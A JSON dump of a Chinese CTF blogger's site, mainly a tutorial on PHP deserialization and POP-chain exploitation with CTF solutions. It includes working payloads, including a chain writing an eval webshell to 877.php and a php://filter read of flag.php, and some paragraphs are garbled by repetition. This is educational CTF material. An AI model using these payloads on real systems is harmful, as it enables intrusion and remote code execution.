{"meta":{"title":"spaceman'blog","subtitle":"","description":"","author":"spaceman","url":"https://spaceman-911.gitee.io","root":"/"},"pages":[{"title":"404","text":"1&lt;style type=&quot;text/css&quot;&gt; .article-header &#123; padding: 0; padding-top: 26px; border-left: none; text-align: center; &#125; .article-header:hover &#123; border-left: none; &#125; .article-title &#123; font-size: 2.1em; &#125; strong a &#123; color: #747474; &#125; .article-meta &#123; display: none; &#125; .share &#123; display: none; &#125; .ds-meta &#123; display: none; &#125; .player &#123; margin-left: -10px; &#125; .sign &#123; text-align: right; font-style: italic; &#125; #page-visit &#123; display: none; &#125; .center &#123; text-align: center; height: 2.5em; font-weight: bold; &#125; .article-entry hr &#123; margin: 0; &#125; .pic &#123; text-align: center; margin: 0; &#125; .pic br &#123; display: none; &#125; #container .article-info-post.article-info &#123; display: none; &#125; #container .article .article-title &#123; padding: 0; &#125;&lt;/style&gt;","path":"/404.html","date":"02-11","excerpt":""},{"title":"About","text":"CTF：会一点 web、misc 渗透：会一点工具的使用和一点实战 战队：Firebasky 后援团 团队：太菜了，暂无 学校：新疆师范大学 爱好：女 特长：划水、脚本梭哈 QQ：1006848997","path":"about/index.html","date":"02-10","excerpt":""},{"title":"分类","text":"","path":"categories/index.html","date":"02-10","excerpt":""},{"title":"search","text":"","path":"search/index.html","date":"02-10","excerpt":""},{"title":"CVE","text":"这个 bug 暂时不会修","path":"tags/index.html","date":"02-10","excerpt":""}],"posts":[{"title":"PHP-反序列化（超细的）","text":"# PHP - 反序列化（超细的） 很多小伙伴都催更了，先跟朋友们道个歉，摸鱼太久了，哈哈哈，今天就整理一下大家遇到比较多的 php 反序列化，经常在 ctf 中看到，还有就是审计的时候也会需要，这里我就细讲一下，我建议大家自己复制源码去搭建运行，只有自己去好好理解，好好利用了才更好的把握，才能更快的找出 pop 链子，首先呢反序列化最重要的就是那些常见的魔法函数，很多小伙伴都不知道这个魔法函数是干啥的，今天我就一个一个，细致的讲讲一些常见的魔法函数，以及最后拿一些 ctf 题举例，刚开始需要耐心的看，谢谢大家的关注，我会更努力的。 常见的 PHP 魔术方法： 1234567891011__construct： 在创建对象时候初始化对象，一般用于对变量赋初值。__destruct： 和构造函数相反，当对象所在函数调用完毕后执行。__call：当调用对象中不存在的方法会自动调用该方法。__get()：获取对象不存在的属性时执行此函数。__set()：设置对象不存在的属性时执行此函数。 __toString：当对象被当做一个字符串使用时调用。__sleep：序列化对象之前就调用此方法(其返回需要一个数组)__wakeup：反序列化恢复对象之前调用该方法__isset()：在不可访问的属性上调用isset()或empty()触发__unset()：在不可访问的属性上使用unset()时触发__invoke() ：将对象当作函数来使用时执行此方法 # __construct 与 __destruct __construct ： 在创建对象时候初始化对象，一般用于对变量赋初值。 __destruct ： 和构造函数相反，当对象所在函数调用完毕后执行。 例： 12345678910111213141516171819202122232425262728293031323334353637&lt;?phpclass Test&#123; public $name; public $age; public $string; // __construct：实例化对象时被调用.其作用是拿来初始化一些值。 public function __construct($name, $age, $string)&#123; echo &quot;__construct 初始化&quot;.&quot;&lt;br&gt;&quot;; $this-&gt;name = $name; $this-&gt;age = $age; $this-&gt;string = $string; &#125; // __destruct：当删除一个对象或对象操作终止时被调用。其最主要的作用是拿来做垃圾回收机制。 /* * 当对象销毁时会调用此方法 * 一是用户主动销毁对象，二是当程序结束时由引擎自动销毁 */ function __destruct()&#123; echo &quot;__destruct 类执行完毕&quot;.&quot;&lt;br&gt;&quot;; &#125;&#125;// 主动销毁$test = new Test(&quot;Spaceman&quot;,566, &#x27;Test String&#x27;);unset($test);// 主动销毁先执行__destruct再执行下面的echoecho &#x27;566&#x27;.&#x27;&lt;br&gt;&#x27;;echo &#x27;----------------------&lt;br&gt;&#x27;;// 程序结束自动销毁$test = new test(&quot;Spaceman&quot;,566, &#x27;Test String&#x27;);// 自动销毁先执行下面的echo，程序结束才执行__destructecho &#x27;666&#x27;.&#x27;&lt;br&gt;&#x27;;?&gt; 运行结果： 1234567__construct 初始化__destruct 类执行完毕566----------------------__construct 初始化666__destruct 类执行完毕 # __call __call ：当调用对象中不存在的方法会自动调用该方法。 调用某个方法， 若方法存在，则直接调用；若不存在，则会去调用__call 函数。 例： 123456789101112131415161718192021&lt;?phpclass Test&#123; public function good($number,$string)&#123; echo &#x27;存在good方法&#x27;.&#x27;&lt;br&gt;&#x27;; echo $number.&#x27;---------&#x27;.$string.&#x27;&lt;br&gt;&#x27;; &#125; // 当调用类中不存在的方法时，就会调用__call(); public function __call($method,$args)&#123; echo &#x27;不存在&#x27;.$method.&#x27;方法&#x27;.&#x27;&lt;br&gt;&#x27;; var_dump($args); &#125;&#125;$a = new Test();$a-&gt;good(566,&#x27;nice&#x27;);$b = new Test();$b-&gt;spaceman(899,&#x27;no&#x27;);?&gt; 运行结果： 123456789存在good方法566---------nice不存在spaceman方法array(2) &#123; [0] =&gt; int(899) [1] =&gt; string(2) &quot;no&quot;&#125; # __get() __get() ：访问不存在的成员变量时调用的； 用来获取私有属性 读取一个对象的属性时，若属性存在，则直接返回属性值； 若不存在，则会调用__get 函数。 例： 1234567891011121314151617&lt;?phpclass Test &#123; public $n=123; // __get()：访问不存在的成员变量时调用 public function __get($name)&#123; echo &#x27;__get 不存在成员变量&#x27;.$name.&#x27;&lt;br&gt;&#x27;; &#125;&#125;$a = new Test();// 存在成员变量n，所以不调用__getecho $a-&gt;n;echo &#x27;&lt;br&gt;&#x27;;// 不存在成员变量spaceman，所以调用__getecho $a-&gt;spaceman; 运行结果： 12123__get 不存在成员变量spaceman # __set() __set() ：设置不存在的成员变量时调用的； 设置一个对象的属性时， 若属性存在，则直接赋值； 若不存在，则会调用__set 函数。 例： 123456789101112131415161718192021222324252627282930313233343536&lt;?phpclass Test&#123; public $data = 100; protected $noway=0; // __set()：设置对象不存在的属性或无法访问(私有)的属性时调用 /* __set($name, $value) * 用来为私有成员属性设置的值 * 第一个参数为你要为设置值的属性名，第二个参数是要给属性设置的值，没有返回值。 */ public function __set($name,$value)&#123; echo &#x27;__set 不存在成员变量 &#x27;.$name.&#x27;&lt;br&gt;&#x27;; echo &#x27;即将设置的值 &#x27;.$value.&quot;&lt;br&gt;&quot;; $this-&gt;noway=$value; &#125; public function Get()&#123; echo $this-&gt;noway; &#125;&#125;$a = new Test();// 读取 noway 的值，初始为0$a-&gt;Get();echo &#x27;&lt;br&gt;&#x27;;// 无法访问(私有)noway属性时调用，并设置值为899$a-&gt;noway = 899;// 经过__set方法的设置noway的值为899$a-&gt;Get();echo &#x27;&lt;br&gt;&#x27;;// 设置对象不存在的属性spaceman$a-&gt;spaceman = 566;// 经过__set方法的设置noway的值为566$a-&gt;Get();?&gt; 运行结果： 12345670__set 不存在成员变量 noway即将设置的值 899899__set 不存在成员变量 spaceman即将设置的值 566566 # __get 与 __set 例： 1234567891011121314151617181920212223242526272829303132333435&lt;?phpclass Person&#123; private $name; private $sex; private $age; //__get()方法用来获取私有属性 public function __get($property_name)&#123; echo &quot;在直接获取私有属性值的时候，自动调用了这个__get()方法&lt;br&gt;&quot;; if(isset($this-&gt;$property_name)) &#123; return($this-&gt;$property_name); &#125; else &#123; return(NULL); &#125; &#125; // __set()方法用来设置私有属性 public function __set($property_name, $value)&#123; echo &quot;在直接设置私有属性值的时候，自动调用了这个__set()方法为私有属性赋值&lt;br&gt;&quot;; $this-&gt;$property_name = $value; &#125;&#125;$a = new Person();// 直接为私有属性赋值的操作，会自动调用__set()方法进行赋值$a-&gt;name=&quot;张三&quot;;$a-&gt;sex=&quot;男&quot;;$a-&gt;age=20;// 直接获取私有属性的值，会自动调用__get()方法，返回成员属性的值echo &quot;姓名：&quot;.$a-&gt;name.&quot;&lt;br&gt;&quot;;echo &quot;性别：&quot;.$a-&gt;sex.&quot;&lt;br&gt;&quot;;echo &quot;年龄：&quot;.$a-&gt;age.&quot;&lt;br&gt;&quot;;?&gt; 运行结果： 123456789在直接设置私有属性值的时候，自动调用了这个__set()方法为私有属性赋值在直接设置私有属性值的时候，自动调用了这个__set()方法为私有属性赋值在直接设置私有属性值的时候，自动调用了这个__set()方法为私有属性赋值在直接获取私有属性值的时候，自动调用了这个__get()方法姓名：张三在直接获取私有属性值的时候，自动调用了这个__get()方法性别：男在直接获取私有属性值的时候，自动调用了这个__get()方法年龄：20 # __toString() __toString() ：在对象当做字符串的时候会被调用。 例： 123456789101112131415161718192021&lt;?phpclass Test&#123; public $variable = &#x27;This is a string&#x27;; public function good()&#123; echo $this-&gt;variable . &#x27;&lt;br /&gt;&#x27;; &#125; // 在对象当做字符串的时候会被调用 public function __toString() &#123; return &#x27;__toString &lt;br&gt;&#x27;; &#125;&#125;$a = new Test();$a-&gt;good();echo $a;?&gt; 运行结果： 12This is a string__toString # __sleep() __sleep() ： serialize 之前被调用，可以指定要序列化的对象属性。 例： 1234567891011121314151617181920212223242526&lt;?phpclass Test&#123; public $name; public $age; public $string; // __construct：实例化对象时被调用.其作用是拿来初始化一些值。 public function __construct($name, $age, $string)&#123; echo &quot;__construct 初始化&quot;.&quot;&lt;br&gt;&quot;; $this-&gt;name = $name; $this-&gt;age = $age; $this-&gt;string = $string; &#125; // __sleep() ： serialize之前被调用，可以指定要序列化的对象属性 public function __sleep()&#123; echo &quot;当在类外部使用serialize()时会调用这里的__sleep()方法&lt;br&gt;&quot;; // 例如指定只需要 name 和 age 进行序列化，必须返回一个数值 return array(&#x27;name&#x27;, &#x27;age&#x27;); &#125;&#125;$a = new Test(&quot;Spaceman&quot;,566, &#x27;Test String&#x27;);echo serialize($a);?&gt; 运行结果： 123__construct 初始化当在类外部使用serialize()时会调用这里的__sleep()方法O:4:&quot;Test&quot;:2:&#123;s:4:&quot;name&quot;;s:8:&quot;Spaceman&quot;;s:3:&quot;age&quot;;i:566;&#125; # __wakeup __wakeup ：反序列化恢复对象之前调用该方法 例： 123456789101112131415161718192021222324&lt;?phpclass Test&#123; public $sex; public $name; public $age; public function __construct($name, $age, $sex)&#123; $this-&gt;name = $name; $this-&gt;age = $age; $this-&gt;sex = $sex; &#125; public function __wakeup()&#123; echo &quot;当在类外部使用unserialize()时会调用这里的__wakeup()方法&lt;br&gt;&quot;; $this-&gt;age = 566; &#125;&#125;$person = new Test(&#x27;spaceman&#x27;,21,&#x27;男&#x27;);$a = serialize($person);echo $a.&quot;&lt;br&gt;&quot;;var_dump (unserialize($a));?&gt; 运行结果： 12345678910O:4:&quot;Test&quot;:3:&#123;s:3:&quot;sex&quot;;s:3:&quot;男&quot;;s:4:&quot;name&quot;;s:8:&quot;spaceman&quot;;s:3:&quot;age&quot;;i:21;&#125;当在类外部使用unserialize()时会调用这里的__wakeup()方法class Test#2 (3) &#123; public $sex =&gt; string(3) &quot;男&quot; public $name =&gt; string(8) &quot;spaceman&quot; public $age =&gt; int(566)&#125; # __isset() __isset() : 检测对象的某个属性是否存在时执行此函数。 当对不可访问属性调用 isset () 或 empty () 时，__isset () 会被调用。 例： 1234567891011121314151617181920212223242526&lt;?phpclass Person&#123; public $sex; private $name; private $age; public function __construct($name, $age, $sex)&#123; $this-&gt;name = $name; $this-&gt;age = $age; $this-&gt;sex = $sex; &#125; // __isset()：当对不可访问属性调用 isset() 或 empty() 时，__isset() 会被调用。 public function __isset($content)&#123; echo &quot;当在类外部使用isset()函数测定私有成员 &#123;$content&#125; 时，自动调用&lt;br&gt;&quot;; return isset($this-&gt;$content); &#125;&#125;$person = new Person(&quot;spaceman&quot;, 25,&#x27;男&#x27;);// public 成员echo ($person-&gt;sex),&quot;&lt;br&gt;&quot;;// private 成员echo isset($person-&gt;name);?&gt; 运行结果： 123男当在类外部使用isset()函数测定私有成员 name 时，自动调用1 # __unset() __unset() ：在不可访问的属性上使用 unset () 时触发 销毁对象的某个属性时执行此函数。 1、 如果一个对象里面的成员属性是公有的，就可以使用这个函数在对象外面删除对象的公有属性。 2、 如果对象的成员属性是私有的，我使用这个函数就没有权限去删除。 例： 1234567891011121314151617181920212223242526&lt;?phpclass Person&#123; public $sex; private $name; private $age; public function __construct($name, $age, $sex)&#123; $this-&gt;name = $name; $this-&gt;age = $age; $this-&gt;sex = $sex; &#125; // __unset()：销毁对象的某个属性时执行此函数 public function __unset($content) &#123; echo &quot;当在类外部使用unset()函数来删除私有成员时自动调用的&lt;br&gt;&quot;; echo isset($this-&gt;$content).&quot;&lt;br&gt;&quot;; &#125;&#125;$person = new Person(&quot;spaceman&quot;, 21,&quot;男&quot;); // 初始赋值unset($person-&gt;sex);echo &quot;666666&lt;br&gt;&quot;;unset($person-&gt;name);unset($person-&gt;age);?&gt; 运行结果： 12345666666当在类外部使用unset()函数来删除私有成员时自动调用的1当在类外部使用unset()函数来删除私有成员时自动调用的1 # __invoke() __invoke() ：将对象当作函数来使用时执行此方法，通常不推荐这样做。 例： 1234567891011121314&lt;?phpclass Test&#123; // _invoke()：以调用函数的方式调用一个对象时，__invoke() 方法会被自动调用 public function __invoke($param1, $param2, $param3) &#123; echo &quot;这是一个对象&lt;br&gt;&quot;; var_dump($param1,$param2,$param3); &#125;&#125;$a = new Test();$a(&#x27;spaceman&#x27;,21,&#x27;男&#x27;);?&gt; 运行结果： 1234这是一个对象string(8) &quot;spaceman&quot;int(21)string(3) &quot;男&quot; # 举例 # pop 链的利用 # 例 1： 123456789101112131415161718192021222324252627282930313233&lt;?phphighlight_file(__FILE__);class pop &#123; public $ClassObj; // 对象实例化时调用 function __construct() &#123; $this-&gt;ClassObj = new hello(); &#125; // 对象销毁或程序运行结束时调用 function __destruct() &#123; $this-&gt;ClassObj-&gt;action(); &#125;&#125;class hello &#123; function action() &#123; echo &quot;&lt;br&gt; hello pop &quot;; &#125;&#125;class shell &#123; public $data; function action() &#123; eval($this-&gt;data); &#125;&#125;$a = new pop();unserialize($_GET[&#x27;s&#x27;]); 简单的审计一下，可以发现，pop 类本来是调用 hello 类的，然后程序结束执行 action 方法，但是 shell 类也有 action 方法，所以就可以构造 pop 链，使其 pop 类调用 shell 类从而执行 eval 函数。 构造如下： 1234567891011121314151617181920&lt;?phphighlight_file(__FILE__);class pop &#123; public $ClassObj; function __construct() &#123; $this-&gt;ClassObj = new shell(); &#125;&#125;class shell &#123; public $data = &quot;phpinfo();&quot;; function action() &#123; eval($this-&gt;data); &#125;&#125;echo serialize(new pop()); 运行结果： 1O:3:&quot;pop&quot;:1:&#123;s:8:&quot;ClassObj&quot;;O:5:&quot;shell&quot;:1:&#123;s:4:&quot;data&quot;;s:10:&quot;phpinfo();&quot;;&#125;&#125; 不过需要注意的是 private 属性和 protected 属性 12345678910111213141516171819&lt;?phphighlight_file(__FILE__);class pop &#123; public $Pub = &quot;spaceman&quot;; private $Pri = &quot;good&quot;; protected $ClassObj; function __construct() &#123; $this-&gt;ClassObj = new hello(); &#125;&#125;class hello &#123;&#125;echo urlencode(serialize(new pop())); 运行结果如下， 有 %00 存在是因为 private 属性和 protected 属性 1O%3A3%3A%22pop%22%3A3%3A%7Bs%3A3%3A%22Pub%22%3Bs%3A8%3A%22spaceman%22%3Bs%3A8%3A%22%00pop%00Pri%22%3Bs%3A4%3A%22good%22%3Bs%3A11%3A%22%00%2A%00ClassObj%22%3BO%3A5%3A%22hello%22%3A0%3A%7B%7D%7D # 例 2： [MRCTF2020]Ezpop 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950&lt;?phpclass Modifier &#123; protected $var; public function append($value)&#123; include($value); &#125; public function __invoke()&#123; $this-&gt;append($this-&gt;var); &#125;&#125;class Show&#123; public $source; public $str; public function __construct($file=&#x27;index.php&#x27;)&#123; $this-&gt;source = $file; echo &#x27;Welcome to &#x27;.$this-&gt;source.&quot;&lt;br&gt;&quot;; &#125; public function __toString()&#123; return $this-&gt;str-&gt;source; &#125; public function __wakeup()&#123; if(preg_match(&quot;/gopher|http|file|ftp|https|dict|\\.\\./i&quot;, $this-&gt;source)) &#123; echo &quot;hacker&quot;; $this-&gt;source = &quot;index.php&quot;; &#125; &#125;&#125;class Test&#123; public $p; public function __construct()&#123; $this-&gt;p = array(); &#125; public function __get($key)&#123; $function = $this-&gt;p; return $function(); &#125;&#125;if(isset($_GET[&#x27;pop&#x27;]))&#123; @unserialize($_GET[&#x27;pop&#x27;]);&#125;else&#123; $a=new Show; highlight_file(__FILE__);&#125; 首先看看所涉及到的魔术方法： 12345__construct() 当一个对象创建时被调用__toString() 当一个对象被当作一个字符串使用__wakeup() 将在反序列化之后立即被调用__get() 访问不存在的成员变量时调用的__invoke() 将对象当作函数来使用时执行此方法 我们可以先一个一个类看看怎么利用 Modifier 类： 12345678910111213141516171819&lt;?phphighlight_file(__FILE__);class Modifier &#123; protected $var = &#x27;info.php&#x27;; public function append($value)&#123; include($value); &#125; public function __invoke()&#123; echo &#x27;__invoke&#x27;.&quot;&lt;br&gt;&quot;; $this-&gt;append($this-&gt;var); &#125;&#125;$a = new Modifier();$a(); 这里假设需要 include 的文件是 info.php 简单解释一下代码的意思，就是我们需要执行 append 方法，若需要执行该方法可通过 __invoke 方法执行，也就是当将对象当作函数来使用时执行 __invoke 方法 所以我们就可以先创建这个对象然后再拿来当函数使用，就会自动触发 __invoke 方法，从而就可以执行 append 方法包含 info.php 文件 运行结果： 接下来是 Test 类： 1234567891011class Test&#123; public $p; public function __construct()&#123; $this-&gt;p = array(); &#125; public function __get($key)&#123; $function = $this-&gt;p; return $function(); &#125;&#125; 首先是 __construct 方法初始化设置 p 是一个数组，这显然不是我们需要的，但我们可以重新初始化，然后是 __get 方法，访问不存在的成员变量时调用，而且返回的是方法，这不就可以配合第一个 Modifier 类使用了吗，使用 Test 类的 __get 方法调用 Modifier 类，所以我们可以使 Test 类初始化将 $p 的值设为 Modifier 对象，然后再经过 __get 方法以函数的方式执行 Modifier 对象（即访问一个 Test 类不存在的属性），这样就可以使用 Modifier 对象的 append 方法了，如下： 12345678910111213141516171819202122232425262728293031&lt;?phpclass Modifier &#123; protected $var = &#x27;info.php&#x27;; public function append($value)&#123; include($value); &#125; public function __invoke()&#123; echo &#x27;__invoke&#x27;.&quot;&lt;br&gt;&quot;; $this-&gt;append($this-&gt;var); &#125;&#125;class Test&#123; public $p; public function __construct()&#123; $this-&gt;p = new Modifier(); &#125; public function __get($key)&#123; $function = $this-&gt;p; return $function(); &#125;&#125;$a = new Test();$a-&gt;no;?&gt; 运行结果： 最后是这个 Show 类 123456789101112131415161718class Show&#123; public $source; public $str; public function __construct($file=&#x27;index.php&#x27;)&#123; $this-&gt;source = $file; echo &#x27;Welcome to &#x27;.$this-&gt;source.&quot;&lt;br&gt;&quot;; &#125; public function __toString()&#123; return $this-&gt;str-&gt;source; &#125; public function __wakeup()&#123; if(preg_match(&quot;/gopher|http|file|ftp|https|dict|\\.\\./i&quot;, $this-&gt;source)) &#123; echo &quot;hacker&quot;; $this-&gt;source = &quot;index.php&quot;; &#125; &#125;&#125; 首先使用 unserialize 会先触发 __wakeup 方法，这个方法在这里其实就是充当过滤字符，接着是初始化方法，这个方法有个关键的地方就是使用了 echo 打印字符串，并且将 source 拼接起来打印，而 __toString() 就是当一个对象被当作一个字符串时调用，正好可以利用初始化方法的 echo 去完成调用。 分析了这么多，最后就可以构造最终的 pop 链了，先上 payload 再继续讲 1234567891011121314151617181920212223242526272829&lt;?phpclass Modifier &#123; protected $var = &#x27;info.php&#x27;;&#125;class Show&#123; public $source; public $str; public function __construct($file)&#123; $this-&gt;source = $file; echo &#x27;Welcome to &#x27;.$this-&gt;source.&quot;&lt;br&gt;&quot;; &#125; public function __toString()&#123; return &quot;566&quot;; &#125;&#125;class Test&#123; public $p; public function __construct()&#123; $this-&gt;p = new Modifier(); &#125;&#125;$a = new Show(&#x27;spaceman&#x27;);$a-&gt;str = new Test();$c = new Show($a);echo serialize($c); 运行结果有不可显示字符 %00 这里我手动加上了，所以可以使用 urlencode 一下，我这里是为了更直观的查看所以直接序列化 123Welcome to spacemanWelcome to 566O:4:&quot;Show&quot;:2:&#123;s:6:&quot;source&quot;;O:4:&quot;Show&quot;:2:&#123;s:6:&quot;source&quot;;s:8:&quot;spaceman&quot;;s:3:&quot;str&quot;;O:4:&quot;Test&quot;:1:&#123;s:1:&quot;p&quot;;O:8:&quot;Modifier&quot;:1:&#123;s:6:&quot;%00*%00var&quot;;s:8:&quot;info.php&quot;;&#125;&#125;&#125;s:3:&quot;str&quot;;N;&#125; $a = new Show('spaceman'); 首先是 new 一个 Show 对象，然后初始化 source 的值，如 spaceman 等字符，这个没多大影响，只是为了调用 Test 类中的 __get 方法，那如何调用的呢 $a-&gt;str = new Test(); 将 Show 类的 str 属性设为 new Test () $c = new Show($a); 然后再用 Show 类初始化刚刚构造的 Show 类，这里可能就有点绕了，为何我们需要这样构造呢，因为我们需要触发 Show 的 __toString() 方法，让 str 能调用 source，而经过刚刚的赋值，str 为 new Test() ，source 为 new Show('spaceman') 中的 spaceman ，那么 __toString 方法中的 str-&gt;source 就是访问 Test 类中的 spaceman 属性，然而 Test 类没有 spaceman 属性，那么就会触发 __get 方法，而该方法又会触发 Modifier 类中的 __invoke 方法，最后就完成了 include 所以大概调用的过程是： 1Show::__toString()--&gt;Test::__get()--&gt;Modifier::__invoke() 执行结果： 当然这是文件包含，那么想要读取文件应该怎么办呢，可以 php 伪协议使用，所以可以这样构造读取文件 12345678910111213141516171819202122232425262728293031&lt;?phpclass Modifier &#123; protected $var = &#x27;php://filter/read=convert.base64-encode/resource=flag.php&#x27;;&#125;class Show&#123; public $source; public $str; public function __construct($file)&#123; $this-&gt;source = $file; echo &#x27;Welcome to &#x27;.$this-&gt;source.&quot;&lt;br&gt;&quot;; &#125; public function __toString()&#123; return &quot;566&quot;; &#125;&#125;class Test&#123; public $p; public function __construct()&#123; $this-&gt;p = new Modifier(); &#125;&#125;$a = new Show(&#x27;spaceman&#x27;);$a-&gt;str = new Test();$c = new Show($a);echo serialize($c);//O:4:&quot;Show&quot;:2:&#123;s:6:&quot;source&quot;;O:4:&quot;Show&quot;:2:&#123;s:6:&quot;source&quot;;s:8:&quot;spaceman&quot;;s:3:&quot;str&quot;;O:4:&quot;Test&quot;:1:&#123;s:1:&quot;p&quot;;O:8:&quot;Modifier&quot;:1:&#123;s:6:&quot;%00*%00var&quot;;s:57:&quot;php://filter/read=convert.base64-encode/resource=flag.php&quot;;&#125;&#125;&#125;s:3:&quot;str&quot;;N;&#125; 运行结果 执行： 最后 base64 解码即可 # 例 3： ctfshow 反序列化 web261 123456789101112131415161718192021222324252627282930313233343536373839&lt;?phphighlight_file(__FILE__);class ctfshowvip&#123; public $username; public $password; public $code; public function __construct($u,$p)&#123; $this-&gt;username=$u; $this-&gt;password=$p; &#125; public function __wakeup()&#123; if($this-&gt;username!=&#x27;&#x27; || $this-&gt;password!=&#x27;&#x27;)&#123; die(&#x27;error&#x27;); &#125; &#125; public function __invoke()&#123; eval($this-&gt;code); &#125; public function __sleep()&#123; $this-&gt;username=&#x27;&#x27;; $this-&gt;password=&#x27;&#x27;; &#125; public function __unserialize($data)&#123; $this-&gt;username=$data[&#x27;username&#x27;]; $this-&gt;password=$data[&#x27;password&#x27;]; $this-&gt;code = $this-&gt;username.$this-&gt;password; &#125; public function __destruct()&#123; if($this-&gt;code==0x36d)&#123; file_put_contents($this-&gt;username, $this-&gt;password); &#125; &#125;&#125;unserialize($_GET[&#x27;vip&#x27;]); 首先呢了解一个上文没讲过的 __unserialize() 方法， 反序列化函数，用于序列化的 SET 类型数据。如果参数不是序列化的 SET，那么会直接返回。如果是一个序列化的 SET，但不是 PHP-REDIS 序列化的格式，函数将抛出一个异常。 Examples： 12$redis-&gt;setOpt(Redis::OPT_SERIALIZER, Redis::SERIALIZER_PHP);$redis-&gt;_unserialize(&#x27;a:3:&#123;i:0;i:1;i:1;i:2;i:2;i:3;&#125;&#x27;); // Will return Array(1,2,3) 所以我们此时应该先想怎么序列化 __sleep() serialize 之前被调用，可以指定要序列化的对象属性。 所以在反序列化的时候就没啥用了，我们自己序列化的时候也不加，而 __unserialize 在序列化的时候也用不到， __wakeup 是反序列化恢复对象之前调用的方法，所以跟序列化也没啥关系， __invoke() 是将对象当作函数来使用时执行此方法，但是我发现并不需要调用此方法，因为 __destruct() 方法中有 file_put_contents 函数可以写文件，所以我们需要满足 code==0x36d 即可将文件写入，这里不难发现是弱类型比较，所以 887.php==0x36d 是成立的，所以我们可以直接构造如下： 123456789101112&lt;?phpclass ctfshowvip&#123; public $username; public $password; public function __construct($u,$p)&#123; $this-&gt;username=$u; $this-&gt;password=$p; &#125;&#125;$a = new ctfshowvip(&#x27;877.php&#x27;,&#x27;&lt;?php eval($_POST[1]);?&gt;&#x27;);echo serialize($a); 为什么可以直接这样构造而不被 __wakeup() 拦截呢，因为含有 __unserialize（） ，就是当一个类中同时含有这两个方法时只有 __unserialize 生效，而 __wakeup() 失效，如下： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354 &lt;?phphighlight_file(__FILE__);class ctfshowvip&#123; public $username; public $password; public $code; public function __construct($u,$p)&#123; echo &quot;__construct()&lt;br&gt;&quot;; $this-&gt;username=$u; $this-&gt;password=$p; &#125; public function __wakeup()&#123; echo &quot;__wakeup()&lt;br&gt;&quot;; if($this-&gt;username!=&#x27;&#x27; || $this-&gt;password!=&#x27;&#x27;)&#123; die(&#x27;error&#x27;); &#125; &#125; public function __invoke()&#123; echo &quot;__invoke()&lt;br&gt;&quot;; eval($this-&gt;code); &#125; public function __sleep()&#123; echo &quot;__sleep()&lt;br&gt;&quot;; $this-&gt;username=&#x27;&#x27;; $this-&gt;password=&#x27;&#x27;; &#125; public function __unserialize($data)&#123; echo &quot;__unserialize()&lt;br&gt;&quot;; $this-&gt;username=$data[&#x27;username&#x27;]; $this-&gt;password=$data[&#x27;password&#x27;]; $this-&gt;code = $this-&gt;username.$this-&gt;password; var_dump($data); echo &quot;&lt;br&gt;&quot;; echo $this-&gt;code; echo &quot;&lt;br&gt;&quot;; &#125; public function __destruct()&#123; echo &quot;__destruct()&lt;br&gt;&quot;; if($this-&gt;code==0x36d)&#123; echo &quot;file_put_contents-----good!&lt;br&gt;&quot;; &#125; &#125;&#125;unserialize($_GET[&#x27;vip&#x27;]); 运行结果： 12345__unserialize()array(2) &#123; [&quot;username&quot;]=&gt; string(7) &quot;877.php&quot; [&quot;password&quot;]=&gt; string(24) &quot;&lt;?php eval($_POST[1]);?&gt;&quot; &#125;877.php__destruct()file_put_contents-----good! 成功写入木马，剩下的操作就不说了 # 例 4： 2021 蓝帽杯半决赛 - 杰克与肉丝 源码： 123456789101112131415161718192021222324252627282930313233343536373839404142&lt;?phphighlight_file(__file__); class Jack &#123; private $action; function __set($a, $b) &#123; $b-&gt;$a(); &#125;&#125;class Love &#123; public $var; function __call($a,$b) &#123; $rose = $this-&gt;var; call_user_func($rose); &#125; private function action()&#123; echo &quot;jack love rose&quot;; &#125;&#125;class Titanic&#123; public $people; public $ship; function __destruct()&#123; $this-&gt;people-&gt;action=$this-&gt;ship; &#125;&#125;class Rose&#123; public $var1; public $var2; function __invoke()&#123; //if( ($this-&gt;var1 != $this-&gt;var2) &amp;&amp; (md5($this-&gt;var1) === md5($this-&gt;var2)) &amp;&amp; (sha1($this-&gt;var1)=== sha1($this-&gt;var2)) )&#123; eval($this-&gt;var1); //&#125; &#125;&#125;if(isset($_GET[&#x27;love&#x27;]))&#123; $sail=$_GET[&#x27;love&#x27;]; unserialize($sail);&#125;?&gt; 为了不受其他因素干扰，我先把这个 Rose 类__invoke 函数的 if 语句注释，就是为了更方便的看看怎么构造的，所以首先我们应该直接寻找我们最后利用的函数 eval，然后利用逆推的方式，看看是如何触发该函数的，就是看看怎么调用的，invoke () 将对象当作函数来使用时执行此方法，所以刚刚开始我们依旧可以慢慢一步一步测试分析，慢慢一步一步调用 12345678910111213&lt;?phpclass Rose&#123; public $var1 = &quot;phpinfo();&quot;; public $var2; function __invoke()&#123; eval($this-&gt;var1); &#125;&#125;$a = new Rose();echo $a-&gt;var1;$a(); 现在是构造出来了，接着是看看怎么才能调用这个类，而 Love 类有一个是函数以函数的方式，call_user_func 是把第一个参数作为回调函数调用，正好符合了我们需要构造的，所以我们又看一下这个函数是怎么触发的，__call 当调用对象中不存在的方法会自动调用该方法，由于 call_user_func 回调的参数是rose，rose，rose，rose 又是直接等于var，所以我们需要先给var，所以我们需要先给var，所以我们需要先给 var 赋值，这个值就是 Rose 类，这样 call_user_func 回调时就拿 Rose 类当函数执行，这样就可以出发 Rose 类的 eval 了 12345678910111213141516171819202122232425262728&lt;?phpclass Love&#123; public $var; function __call($a,$b) &#123; $rose = $this-&gt;var; echo &quot;$a function not find!&lt;br&gt;&quot;; call_user_func($rose); &#125; private function action()&#123; echo &quot;jack love rose&quot;; &#125;&#125;class Rose&#123; public $var1 = &quot;phpinfo();&quot;; public $var2; function __invoke()&#123; echo $this-&gt;var1; eval($this-&gt;var1); &#125;&#125;$a = new Rose();$b = new Love();$b-&gt;var = $a;$b-&gt;spaceman(566); //不存在的spaceman函数 然后我们继续寻找一下如何在别的类里找一个不存在的函数，b−&gt;spaceman(566)这样的形式Jack类就有，正好又可以构造了，然后我们再看一下怎么触发Jack类中的这个形式，_set设置对象不存在的属性或无法访问(私有)的属性时调用，这里的b-&gt;spaceman(566) 这样的形式Jack类就有，正好又可以构造了，然后我们再看一下怎么触发Jack类中的这个形式，_\\_set 设置对象不存在的属性或无法访问(私有)的属性时调用，这里的b−&gt;spaceman(566)这样的形式Jack类就有，正好又可以构造了，然后我们再看一下怎么触发Jack类中的这个形式，_​set设置对象不存在的属性或无法访问(私有)的属性时调用，这里的 action 是私有的，所以我们可以利用这个 action 1234567891011121314151617181920212223242526272829303132333435363738&lt;?phpclass Jack&#123; private $action; function __set($a, $b) &#123; echo &quot;good! I 